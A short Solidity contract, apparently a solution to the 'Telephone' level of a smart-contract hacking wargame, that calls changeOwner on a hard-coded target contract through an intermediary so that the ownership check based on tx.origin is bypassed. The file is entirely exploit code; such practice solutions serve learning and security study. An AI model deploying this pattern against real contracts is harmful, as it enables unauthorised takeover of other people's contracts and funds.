// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {ITelephone} from "./interfaces/ITelephone.sol";

contract TelephoneAttack {
    address public telephoneAddress = 0xc5EF443FbF02379d69F544346e971ec0F10fe520;
    ITelephone telephone = ITelephone(telephoneAddress);

    function attack(address owner) external {
        telephone.changeOwner(owner);
    }
}
